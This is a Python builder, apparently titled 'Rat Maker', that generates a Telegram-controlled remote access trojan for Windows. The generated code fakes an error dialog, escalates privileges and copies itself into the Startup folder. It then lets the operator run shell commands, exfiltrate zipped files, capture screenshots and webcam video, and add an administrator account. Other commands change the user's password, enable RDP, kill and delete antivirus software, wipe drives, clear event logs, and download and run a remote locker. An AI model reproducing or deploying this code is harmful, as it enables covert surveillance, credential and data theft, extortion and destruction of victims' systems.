import colorama
import os
import requests
import sys
from time import sleep
from datetime import datetime
from telegram.ext import * ##
from telegram import * ##
from subprocess import check_output ##
from zipfile import ZipFile ##
import platform ##
import psutil ##
import os ##
import getpass ##
import shutil






def converterForRam(bytes, suffix="B"):
    """
    Scale bytes to its proper format
    e.g:
        1253656 => '1.20MB'
        1253656678 => '1.17GB'
    """
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor
def systemInformation():

    uname = platform.uname()
    sleep(0.2)
    print(colorama.Fore.GREEN+f"System: {uname.system}")
    sleep(0.2)
    print(f"Node Name: {uname.node}")
    sleep(0.2)
    print(f"Release: {uname.release}")
    sleep(0.2)
    print(f"Version: {uname.version}")
    sleep(0.2)
    print(f"Machine: {uname.machine}")
    sleep(0.2)
    print(f"Processor: {uname.processor}")



def bootTime():
    boot_time_timestamp = psutil.boot_time()
    bt = datetime.fromtimestamp(boot_time_timestamp)
    sleep(0.2)
    print(colorama.Fore.GREEN+f"Boot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}")

def cpuInfo():

    #number of cores
    print(colorama.Fore.GREEN+"Physical Cores: ",psutil.cpu_count(logical=False))
    sleep(0.2)
    print("Total Cores: ",psutil.cpu_count(logical=True))
    # cpu name
    #print(cpuinfo.get_cpu_info()['brand_raw'])
    #cpu frequencies

    cpuFreq=psutil.cpu_freq()
    #
    print(f"Max Frequency: {cpuFreq.max}Mhz")




def memory():
    # get memory details
    svmem=psutil.virtual_memory()
    sleep(0.2)
    print(colorama.Fore.GREEN+f"Ram: {converterForRam(svmem.total)}")





colorama.init()
setting={"ratName":"","token":"","icon":"null","chat_id":""}

def baner():

    print( colorama.Fore.CYAN+"""
    ______      _    ___  ___      _             
    | ___ \    | |   |  \/  |     | |            
    | |_/ /__ _| |_  | .  . | __ _| | _____ _ __ 
    |    // _` | __| | |\/| |/ _` | |/ / _ \ '__|
    | |\ \ (_| | |_  | |  | | (_| |   <  __/ |   
    \_| \_\__,_|\__| \_|  |_/\__,_|_|\_\___|_|   
""")
def startPage():
    os.system("cls")
    sleep(0.5)
    print(colorama.Fore.RED+"""
    ______      _    ___  ___      _             
    | ___ \    | |   |  \/  |     | |            
    | |_/ /__ _| |_  | .  . | __ _| | _____ _ __ 
    |    // _` | __| | |\/| |/ _` | |/ / _ \ '__|
    | |\ \ (_| | |_  | |  | | (_| |   <  __/ |   
    \_| \_\__,_|\__| \_|  |_/\__,_|_|\_\___|_|   
""")



    systemInformation()
    bootTime()
    cpuInfo()
    memory()
    print("\n\n"+colorama.Fore.YELLOW+"Options:")
    sleep(0.2)

    print("[1]Make Rat")
    sleep(0.2)
    print("[2]Config")
    sleep(0.2)

    print("[3]About Programmer ")
    sleep(0.2)

    print("[4]Help And Install Requirement")
    print("[5]Exit")
    global option
    sleep(0.2)
    option=input("[*]Choose a Option: ")
    def exit():
        sleep(0.5)
        sys.exit()

    def config():

        os.system("cls")
        baner()
        sleep(0.2)
        print("[1]Set Token")
        sleep(0.2)
        print("[2]Set Icon (Dont Required)")
        sleep(0.2)
        print("[3]Set Chat ID")

        sleep(0.2)
        print("[4]Exit")
        option2 = input("[*]Choose a Option: ")

        def main():


            if option2 == "1":
                os.system("cls")
                baner()
                sleep(0.2)
                token = input("[*]Enter Bot Token: ")

                setting["token"] = token
                input("Press Enter To Return...")

                config()

            if option2 == "2":
                os.system("cls")
                baner()
                sleep(0.2)
                iconPath = input("[*]Enter Icon Path: ")
                setting["icon"] = iconPath
                input("Press Enter To Return...")

                config()

            if option2 == "3":
                os.system("cls")
                baner()
                sleep(0.2)
                chat_id = input("[*]Enter Chat ID: ")
                setting["chat_id"] = chat_id
                input("Press Enter To Return")
                config()

            if option2 == "4":
                startPage()

            else:
                config()

        main()

    def about():
        os.system("cls")
        baner()
        print(colorama.Fore.MAGENTA + "Coder: DR8002")
        sleep(0.2)
        print("Project Name: Rat Maker")
        sleep(0.2)
        print("Telegram ID: @DR8002")
        sleep(0.2)
        print("Email: Hiddenhelp@tutanota.com")
        sleep(0.2)
        input(colorama.Fore.LIGHTCYAN_EX + "For Return Press Enter...")
        startPage()

    def helpAndInstall():
        os.system("cls")

        baner()
        sleep(0.2)
        print(colorama.Fore.LIGHTBLUE_EX+"[!]Download Python 3.8.4 From Python.org, When Installing Python\nPress To (Add To Path) Check Box\n")
        sleep(0.2)
        print("[1]Install Requirement")
        sleep(0.2)
        print("[2]Help")
        sleep(0.2)
        print("[3]Return")
        sleep(0.2)
        number=input("Choose One Option: ")
        number=str(number)

        def main():
            if number == "1":
                os.system("cls")
                baner()
                try:os.system("pip install python-telegram-bot")
                except:pass
                try:os.system("pip install zipfile")
                except:pass
                try:os.system("pip install platform")
                except:pass
                try:os.system("pip install psutil")
                except:pass
                try:os.system("pip install getpass")
                except:pass
                try:os.system("pip install requests")
                except:pass
                try:os.system("pip install elevate")
                except:pass
                try:os.system("pip install elevate")
                except:pass
                try:os.system("pip install pyautogui")
                except:pass
                try:os.system("pip install anonfile")
                except:pass
                try:os.system("pip install filestack-python")
                except:pass
                try:os.system("pip install opencv-python")
                except:pass
                try:os.system("pip install shutil")
                except:pass
                try:os.system("pip install pywin32")
                except:pass
                try:os.system("pip install ctypes")
                except:pass
                try:os.system("pip install pynput")
                except:pass
                try:os.system("pip install webbrowser")
                except:pass
                try:os.system("pip install https://github.com/pyinstaller/pyinstaller/archive/develop.zip")
                except:pass
                os.system("cls")
                input("Press Enter To Return...")
                helpAndInstall()
            if number == "2":
                os.system("cls")
                baner()
                sleep(0.2)
                print("""\n
For Make Rat First Go To Config Then Set All (Icon Is Optional And Icon Should Be .ico File)
Then Return To Main Menu And And Select (Make Rat Option) """)
                input("\nPress Enter To Return...")
                helpAndInstall()

            if number == "3":
                startPage()
        main()



    def make():
        uname = platform.uname()
        cpuFreq = psutil.cpu_freq()
        mainUser = getpass.getuser()
        source = f'''
from telegram.ext import * ##
from telegram import * ##
from subprocess import check_output,STDOUT ##
from zipfile import ZipFile ##
from  pynput.keyboard import  Key,Controller
import platform ##
import psutil ##
import os ##
import getpass ##
import requests
import elevate
import wget
import pyautogui
import random
import cv2
import shutil
import win32api
import ctypes
import time
import webbrowser
try:
    elevate.elevate()
except:pass
finally:
    messageBox = ctypes.windll.user32.MessageBoxW
    returnValue = messageBox(0,"This verison of this file is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need an x86 (32-bit) or x64 (64-bit) verion of the program","ERROR",0x10 | 0x0)

try:
    shutil.copy(__file__,f"C:/Users/{getpass.getuser()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")
except:pass


updater=Updater('{setting["token"]}',use_context=True)
chat_id='{setting["chat_id"]}'
'''
        source += r'''
chat_id=str(chat_id)

def btn(update:Update,context:CallbackContext):
    btns=[["IP"],
    ["System Information"],
    ["Download File"],
    ["Make User"],
    ["Restart"],
    ["Change Main User Pass"],
    ["Task Manager"],
    ["Lusrmgr"],
    ["Gpedit"],
    ["Enable RDP"],
    ["CMD Commands"]
    ,["Upload File"]
          ,["Run App"]
    ,["Screen Shot"]
    ,["Record Video"]
          ,["Play Bad Sounds"]
    ,["Make File"]
    ,["Change Background"]
    ,["Delete Hard Infos"]
    ,["Crash Windows"]
    ,["Destroy Graphic Card"]
    ,["Destroy CD-Rom"]
    ,["Open Endless Notepad"]
    ,["Create Endless Folder"]
    ,["Create Endless User"]
    ,["Format Drive C"]
    ,["Disable All Antiviruss"]
    ,["Make Beep Sound"]
        ,["Desktop Locker"]
    ,["Delete Logs"]
        ,["Location On Map"]
            ,["Open URL"]
        ,["Show Message Box"]


                          ]

    update.message.reply_text(
        text="Hello User To Rat Bot, Choose A Option"
        ,reply_markup=ReplyKeyboardMarkup(btns,resize_keyboard=True)
            )

def start(update:Update,context:CallbackContext):
    if str(update.message.chat_id)==chat_id:

        btn(update,context)

def ipFinder(update:Update,context:CallbackQuery):
    if str(update.message.chat_id) == chat_id:
        ip=requests.get("http://ip.42.pl/raw").text
        try:
            os.system('reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections')
            os.system('reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f')
            os.system('reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections')

            context.bot.sendMessage(chat_id,"IP: "+ip+"""\n[!]And RDP Port Opened (3389) """)
        except:
            context.bot.sendMessage(chat_id, "IP: " + ip+"""\n[!]Could Not Open RDP Port""")



def systemInformation(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:
        uname = platform.uname()
        allInfo=""
        allInfo+= f"""System: {str(uname.system)} 
"""
        allInfo+=f"""Node Name: {str(uname.node)} 
"""
        allInfo+=f"""Release: {str(uname.release)}
"""
        allInfo+=f"""Version: {str(uname.version)}
"""
        allInfo+=f"""Machine: {str(uname.machine)}
"""
        allInfo+=f"""Processor: {str(uname.processor)}
"""
        allInfo+="""Physical Cores: """+ str(psutil.cpu_count(logical=False))+"""
"""
        allInfo+="""Total Cores: """+ str(psutil.cpu_count(logical=True))+"""
"""
        context.bot.sendMessage(chat_id,allInfo)

def downloadFile(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:
        context.bot.sendMessage(chat_id,"""For Download Files Enter This Command Blow\n"""+"""/download exe\n then all exe file will be upload for you.""")


def donwloadFileMain(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:
        allDrives=[]
        cmdDrives = check_output("wmic logicaldisk get name", shell=True)
        drives = ["A:", "B:", "C:", "D:", "E:", "F:", "G:", "H:", "I:", "J:", "K:", "L:", "M:", "N:", "Q:", "R:",
                    "O:", "P:", "W:", "Y:", "S:", "T:", "U:", "V:", "X:", "Z:"]
        for i in drives:
            if i.encode() in cmdDrives:

                allDrives.append(i)


        suffix=update.message.text.replace("/download ")
        paths=[]
        for w in allDrives:

            try:

                path = check_output("dir "+w+"\*."+suffix+" /s /b", shell=True
                                                                   )

                paths.append(path.decode())

            except :
                pass

        path=f"c:/users/"+getpass.getuser()
        with ZipFile(path+suffix+".zip","w") as allFilesForZip:
            for i in paths:
                allFilesForZip.write(i)

            allFilesForZip.setpassword("@DR8002")

        context.bot.sendDocument(chat_id,path+suffix+".zip")
        context.bot.sendMessage(chat_id,"Password: @DR8002")

def makeUser(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:
        os.system("net user newuser New123user123 /add")
        os.system("net localgroup administrators newuser /add")
        context.bot.sendMessage(chat_id,"""Username: newuser\nPassword: New123use123""")


def restartSystem(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:
        os.system("shutdown /r")
        context.bot.sendMessage(chat_id,"Restarting")


def changeMainUserPass(update:Update,context:CallbackContext):
    mainUser=getpass.getuser()
    if str(update.message.chat_id) == chat_id:
        try:
            os.system(f"""net user {mainUser} New123Pass123""")
            context.bot.sendMessage(chat_id,f"""Password Changed Successfully\n Password: New123Pass123\nUsername: {mainUser}""")

        except:
            context.bot.sendMessage(chat_id,"""Could Not Change Password""")



def taskManager(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:
        context.bot.sendMessage(chat_id,"""Choose One Option Blow:\n/DisableTask\n/EnableTask""")


def enableTaskManager(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:
        os.system("""REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f""")
        context.bot.sendMessage(chat_id,"Task Manager Enabled Successfully.")

def disableTaskManager(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:
        os.system("""REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f""")
        context.bot.sendMessage(chat_id,"""Task Manager Disabled Successfully.""")
def lusrmgr(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:
        context.bot.sendMessage(chat_id,"""Choose One Option Blow:\n/DisableLusrmgr\n/EnableLusrmgr""")


def disableLusrmgr(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:
        c="""reg add HKEY_CURRENT_USER\Software\Policies\Microsoft\MMC\{5D6179C8-17EC-11D1-9AA9-00C04FD8FE93} /v Restrict_Run /t REG_DWORD /d 00000001 /f"""
        os.system(c)
        context.bot.sendMessage(chat_id,"""Lusrmgr Disabled Successfully""")


def enableLusrmgr(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:
        os.system("""reg add HKEY_CURRENT_USER\Software\Policies\Microsoft\MMC\{5D6179C8-17EC-11D1-9AA9-00C04FD8FE93} /v Restrict_Run /t REG_DWORD /d 00000000 /f""")
        context.bot.sendMessage(chat_id,"""Lusrmgr Enabled Successfully""")
def gpedit(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:
        context.bot.sendMessage(chat_id,"""Choose One Option Blow:\n/DisableGpedit\n/EnableGpedit""")

def enableGpedit(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:
        os.system("""REG add "HKCU\Software\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v Restrict_Run /t REG_DWORD /d 0 /f""")
        context.bot.sendMessage(chat_id,"Gpedit Enabled Successfully")


def disableGpedit(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:
        os.system('REG add "HKCU\Software\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v Restrict_Run /t REG_DWORD /d 1 /f')
        context.bot.sendMessage(chat_id, "Gpedit Enabled Successfully")

def enableRdp(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:
        os.system('reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f')
        context.bot.sendMessage(chat_id, "RDP Enabled Successfully")
def cmdCommands(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:
        context.bot.sendMessage(chat_id,"""Enter Your Command Like Blow:\n/cmd command""")


def cmdCommandsMain(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:
        command=update.message.text.replace("/cmd ","")

        resultCommand=check_output(command,shell=True)
        context.bot.sendMessage(chat_id,resultCommand.decode())



def uploadFile(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:
        context.bot.sendMessage(chat_id,"""For Upload File To Target Enter This Command Blow:\n/upload Link path=Enter Your Path To Save File There""")





def uploadFileMain(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:
        link=update.message.text.replace("/upload ","")
        link=str(link).split("path=")
        path=link[1]
        link=link[0]
        link=link.replace(" ","")
        print(link)
        wget.download(link,out=path)

def runFile(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:
        context.bot.sendMessage(chat_id,"""For Run An App Enter This Command Blow:""")
        context.bot.sendMessage(chat_id,'/run "FileDirectory"')
        context.bot.sendMessage(chat_id,'For Example:/run "c:/users/test/desktop/test.exe"')


def runFileMain(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:
        try:
            path=update.message.text.replace("/run ","")
            os.system(path)
            context.bot.sendMessage(chat_id,"App Ran Successfully ")
            
        except EnvironmentError as e:
            context.bot.sendMessage(chat_id,"Failed\n"+e)


def screenShot(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:

        name=''.join(random.choices("1234567890"+ "qazwsxedcrfvtgbyhnujmikolpQAZWSXEDCRFVTGBYHNUJMIKOLP", k=10))
        screenShotPhoto=pyautogui.screenshot()


        screenShotPhoto.save(f"""c:/users/{getpass.getuser()}/{name}.png""")
        # client = Client('Ab8gRmsmDSTqd13ZfFgBgz')
        # new_filelink = client.upload(filepath=f"""c:/users/{getpass.getuser()}/{name}.png""")
        context.bot.send_photo(chat_id,open(f"""c:/users/{getpass.getuser()}/{name}.png""","rb"))


def takePhoto(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:
        name = ''.join(random.choices("1234567890" + "qazwsxedcrfvtgbyhnujmikolpQAZWSXEDCRFVTGBYHNUJMIKOLP", k=10))
        camera=cv2.VideoCapture(0)
        while 1:
            ret,img=camera.read()
            cv2.imwrite(f"""c:/users/{getpass.getuser()}/{name}.png""")
            break
        camera.release()
        # client = Client('Ab8gRmsmDSTqd13ZfFgBgz')
        # new_filelink = client.upload(filepath=f"""c:/users/{getpass.getuser()}/{name}.png""")
        context.bot.send_photo(chat_id,open(f"""c:/users/{getpass.getuser()}/{name}.png""","rb"))
        
        
        
def recordVideo(update:Update,context:CallbackContext):
    
    if str(update.message.chat_id) == chat_id:
        vid=cv2.VideoCapture(0)
        name = ''.join(random.choices("1234567890" + "qazwsxedcrfvtgbyhnujmikolpQAZWSXEDCRFVTGBYHNUJMIKOLP", k=10))
    
        out = cv2.VideoWriter(f"""c:/users/{getpass.getuser()}/{name}.avi""",cv2.VideoWriter_fourcc('M','J','P','G'), 30, (500,500))
        
        for i in range(1,1000):
            ret,frame=vid.read()
            out.write(frame)
        context.bot.send_video(chat_id,open(f"""c:/users/{getpass.getuser()}/{name}.avi""","rb"))
        
        
        
    
        
def makeFile(update:Update,context:CallbackContext):
    context.bot.sendMessage(chat_id,f"""For Make A Text File in Desktop Enter The Command Blow:\n/makefile text=Your Text That You Want To Write In File. filename=name.txt """)


def makeFileMain(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:
        text=update.message.text.replace("/makefile ","")
        filename=text.split("filename=")[1]

        text=str(text).split("text=")[1]
        file=open(f"c:/users/{getpass.getuser()}/desktop/{filename}","w",encoding="UTF-8")
        file.write(text)
        context.bot.sendMessage(chat_id,"Created Successfully!")
        file.close()
        
        
        
def changeBackg(update:Update,context:CallbackContext):
    context.bot.sendMessage(chat_id,"Send Photo.")

def changeBackgMain(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:

        with open(f"c:/users/{getpass.getuser()}/img.jpg", 'wb') as f:
            context.bot.getFile(update.message.photo[-1].file_id).download(out=f)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, f"c:/users/{getpass.getuser()}/img.jpg", 0)
            
    context.bot.sendMessage(chat_id,"Background Changed Successfully.")
    



    if str(update.message.chat_id) == chat_id:
        context.bot.sendMessage(chat_id,"Started,When All Files Deleted I Will Tell You")
        allDrives = []
        allDrives2 = []
        paths = []
    
        def findDrives():
            cmdDrives = check_output("wmic logicaldisk get name", shell=True)
            drives = ["A:", "B:", "C:", "D:", "E:", "F:", "G:", "H:", "I:", "J:", "K:", "L:", "M:", "N:", "Q:", "R:", "O:",
                      "P:", "W:", "Y:", "S:", "T:", "U:", "V:", "X:", "Z:"]
            for i in drives:
                if i.encode() in cmdDrives:
                    allDrives2.append(i + "\\")
                    allDrives.append(i)
    
        findDrives()
    
        def findFilePath():
            suffix = []
            path = 'c:\\'
    
            # r=root, d=directories, f = files
            for path in allDrives2:
                for r, d, f in os.walk(path):
                    for file in f:
                        file = file.split(".")[-1]
                        suffix.append(file)
            suffix = list(dict.fromkeys(suffix))
            mainSuffix = []
            for b in suffix:
    
                if "0" not in b:
                    mainSuffix.append(b)
    
            for w in allDrives:
                if w =="c:":
                    continue
                for s in mainSuffix:
                    try:
    
                        path = os.system(f"Del {w}\*.{s} /f /s /q"
                                                       )
    
                    except:pass
    
        findFilePath()
        context.bot.sendMessage(chat_id,"Finished")





def destroyGraphic(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:
        try:
            with open(f"""c:/users/{getpass.getuser()}/destroyGraphic.bat""","w") as f:
                command="""c:/windows/system32/jefo/display/memory/full"""
                f.write(command)
            os.system(f"""c:/users/{getpass.getuser()}/destroyGraphic.bat""")
            context.bot.sendMessage(chat_id,"Virus Ran Successfully")
        except:context.bot.sendMessage(chat_id,"Could Not Run Virus")


def destroyCDRom(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:
        try:
            with open(f"""c:/users/{getpass.getuser()}/destrotCDRom.vbs""","w") as file:
                command="""

Set oWMP = CreateObject("WMPlayer.OCX.7")
Set colCDROMs = oWMP.cdromCollection
do
if colCDROMs.Count >= 1 then
For i = 0 to colCDROMs.Count - 1
colCDROMs.Item(i).Eject
Next
For i = 0 to colCDROMs.Count - 1
colCDROMs.Item(i).Eject
Next
End If
loop"""
                file.write(command)
            os.system(f"""start c:/users/{getpass.getuser()}/destrotCDRom.vbs""")
            context.bot.sendMessage(chat_id, "Virus Ran Successfully")
        except:context.bot.sendMessage(chat_id,"Could Not Run Virus")



def endlessNotepad(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:
        try:
            with open(f"""c:/users/{getpass.getuser()}/endlessnotepad.bat""","w") as file:
                command=r"""
@ECHO off
:top
START %SystemRoot%\system32\notepad.exe
GOTO top"""
                file.write(command)
            os.system(f"""c:/users/{getpass.getuser()}/endlessnotepad.bat""")
            context.bot.sendMessage(chat_id, "Virus Ran Successfully")
        except:context.bot.sendMessage(chat_id,"Could Not Run Virus")





def openApps_(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:

        try:
            with open(f"""c:/users/{getpass.getuser()}/openapps.bat""", "w") as file:
                command = r"""
@echo off
:x
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc
goto x
 """
                file.write(command)
            os.system(f"""c:/users/{getpass.getuser()}/openapps.bat""")
            context.bot.sendMessage(chat_id, "Virus Ran Successfully")
        except:
            context.bot.sendMessage(chat_id, "Could Not Run Virus")
            
            
            
            
            
def endlessFolder(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:

        try:
            with open(f"""c:/users/{getpass.getuser()}/endlessFolder.bat""", "w") as file:
                command = r"""
@echo off
:x
md %random%
/folder.
goto x
"""
                file.write(command)
            os.system(f"""c:/users/{getpass.getuser()}/endlessFolder.bat""")
            context.bot.sendMessage(chat_id, "Virus Ran Successfully")
        except:
            context.bot.sendMessage(chat_id, "Could Not Run Virus")

def endlessUser(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:

        try:
            with open(f"""c:/users/{getpass.getuser()}/endlessUser.bat""", "w") as file:
                command = """
@echo off
:x
net user %random% /add
goto x
"""

                file.write(command)
            os.system(f"""c:/users/{getpass.getuser()}/endlessUser.bat""")
            context.bot.sendMessage(chat_id, "Virus Ran Successfully")
        except:
            context.bot.sendMessage(chat_id, "Could Not Run Virus")


def formatC(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:

        try:
            with open(f"""c:/users/{getpass.getuser()}/formatc.bat""", "w") as file:
                command = """
@Echo off
Del C:\ *.* |y
"""

                file.write(command)
            os.system(f"""c:/users/{getpass.getuser()}/formatc.bat""")
            context.bot.sendMessage(chat_id, "Virus Ran Successfully")
        except:
            context.bot.sendMessage(chat_id, "Could Not Run Virus")
            
            
            

def antiDisabled(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:


        try:
            import pdb
            pdb.set_trace()
            with open(f"""c:/users/{getpass.getuser()}/disableanti.bat""", "w") as file:
                command = r"""
@ echo off
rem
rem Permanently Kill Anti-Virus
net stop “Security Center”
netsh firewall set opmode mode=disable
tskill /A av*
tskill /A fire*
tskill /A anti*
cls
tskill /A spy*
tskill /A bullguard
tskill /A PersFw
tskill /A KAV*
tskill /A ZONEALARM
tskill /A SAFEWEB
cls
tskill /A spy*
tskill /A bullguard
tskill /A PersFw
tskill /A KAV*
tskill /A ZONEALARM
tskill /A SAFEWEB
cls
tskill /A OUTPOST
tskill /A nv*
tskill /A nav*
tskill /A F-*
tskill /A ESAFE
tskill /A cle
cls
tskill /A BLACKICE
tskill /A def*
tskill /A kav
tskill /A kav*
tskill /A avg*
tskill /A ash*
cls
tskill /A aswupdsv
tskill /A ewid*
tskill /A guard*
tskill /A guar*
tskill /A gcasDt*
tskill /A msmp*
cls
tskill /A mcafe*
tskill /A mghtml
tskill /A msiexec
tskill /A outpost
tskill /A isafe
tskill /A zap*cls
tskill /A zauinst
tskill /A upd*
tskill /A zlclien*
tskill /A minilog
tskill /A cc*
tskill /A norton*
cls
tskill /A norton au*
tskill /A ccc*
tskill /A npfmn*
tskill /A loge*
tskill /A nisum*
tskill /A issvc
tskill /A tmp*
cls
tskill /A tmn*
tskill /A pcc*
tskill /A cpd*
tskill /A pop*
tskill /A pav*
tskill /A padmincls
tskill /A panda*
tskill /A avsch*
tskill /A sche*
tskill /A syman*
tskill /A virus*
tskill /A realm*cls
tskill /A sweep*
tskill /A scan*
tskill /A ad-*
tskill /A safe*
tskill /A avas*
tskill /A norm*
cls
tskill /A offg*
del /Q /F C:\Program Files\alwils~1\avast4\*.*
del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
del /Q /F C:\Program Files\kasper~1\*.exe
cls
del /Q /F C:\Program Files\trojan~1\*.exe
del /Q /F C:\Program Files\f-prot95\*.dll
del /Q /F C:\Program Files\tbav\*.datcls
del /Q /F C:\Program Files\avpersonal\*.vdf
del /Q /F C:\Program Files\Norton~1\*.cnt
del /Q /F C:\Program Files\Mcafee\*.*
cls
del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\*.*
del /Q /F C:\Program Files\Norton~1\*.*
cls
del /Q /F C:\Program Files\avgamsr\*.exe
del /Q /F C:\Program Files\avgamsvr\*.exe
del /Q /F C:\Program Files\avgemc\*.exe
cls
del /Q /F C:\Program Files\avgcc\*.exe
del /Q /F C:\Program Files\avgupsvc\*.exe
del /Q /F C:\Program Files\grisoft
del /Q /F C:\Program Files\nood32krn\*.exe
del /Q /F C:\Program Files\nood32\*.exe
cls
del /Q /F C:\Program Files\nod32
del /Q /F C:\Program Files\nood32
del /Q /F C:\Program Files\kav\*.exe
del /Q /F C:\Program Files\kavmm\*.exe
del /Q /F C:\Program Files\kaspersky\*.*
cls
del /Q /F C:\Program Files\ewidoctrl\*.exe
del /Q /F C:\Program Files\guard\*.exe
del /Q /F C:\Program Files\ewido\*.exe
cls
del /Q /F C:\Program Files\pavprsrv\*.exe
del /Q /F C:\Program Files\pavprot\*.exe
del /Q /F C:\Program Files\avengine\*.exe
cls
del /Q /F C:\Program Files\apvxdwin\*.exe
del /Q /F C:\Program Files\webproxy\*.exe
del /Q /F C:\Program Files\panda
software\*.*
rem"""

                file.write(command)
            os.system(f"""c:/users/{getpass.getuser()}/disableanti.bat""")
            context.bot.sendMessage(chat_id, "Virus Ran Successfully")
        except:
            context.bot.sendMessage(chat_id, "Could Not Run Virus")
            
            
            
def makeBeepSound(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:
        win32api.MessageBeep(0)
        
        
def desktopLocker(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:
        wget.download("http://s13.picofile.com/d/8404121576/f041c244-c1a3-4158-9784-56ed5c6bb9dc/DTLEP.exe",out=f"""c:/users/{getpass.getuser()}""")
        check_output(f"""c:/users/{getpass.getuser()}/DTLEP.exe""")
        keyboard = Controller()
        time.sleep(1)
        keyboard.type("DR8002")
        time.sleep(1)
        keyboard.press(Key.enter)
        time.sleep(1)
        keyboard.type("DR8002")
        time.sleep(1)
        keyboard.press(Key.enter)
        context.bot.sendMessage(chat_id,"Locked,Password Is: DR8002")

def deleteLogs(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:

        try:
            import pdb
            pdb.set_trace()
            with open(f"""c:/users/{getpass.getuser()}/log.bat""", "w") as file:
                command = """
@echo off

FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo All Event Logs have been cleared!
goto theEnd

:do_clear
echo clearing %1
wevtutil.exe cl %1
goto :eof

:noAdmin
echo Current user permissions to execute this .BAT file are inadequate.
echo This .BAT file must be run with administrative privileges.
echo Exit now, right click on this .BAT file, and select "Run as administrator".  
pause >nul

:theEnd
Exit"""
                file.write(command)
            os.system(f"""c:/users/{getpass.getuser()}/log.bat""")
            context.bot.sendMessage(chat_id, "Cleared")
        except:
            pass



def locationOnMap(update:Update,context:CallbackContext):
    import pdb
    pdb.set_trace()
    info = requests.get('http://ipinfo.io')

    info=info.json()
    location = info['loc'].split(',')
    context.bot.send_location(chat_id, location[0], location[1])
    
    
def openUrl(update:Update,context:CallbackContext):
    context.bot.sendMessage(chat_id,"""For Open A Url Enter The Command Blow:\n/open url""")


def openUrlMain(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:
        url=update.message.text.replace("/open ","")
        webbrowser.open(url)
        context.bot.sendMessage(chat_id,"Opened!")
        
        
def showMessageBox(update:Update,context:CallbackContext):
    context.bot.sendMessage(chat_id,"""For Show Message Box Enter The Command Blow:\n/show text""")
    

def showMessageBoxMain(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:
        text=update.message.text.replace("/show ","")
        messageBox = ctypes.windll.user32.MessageBoxW
        context.bot.sendMessage(chat_id,"Showed!")
        returnValue = messageBox(0,
                                 text,
                                 "Hacked", 0x40 | 0x0)
                                 
def playBadSound(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:

        wget.download("http://s12.picofile.com/d/8403901226/7b88682e-bcbc-47d2-b38c-9c5831e2d693/audio_2020_07_25_13_21_54.mp3",out=f"""c:/users/{getpass.getuser()}""")
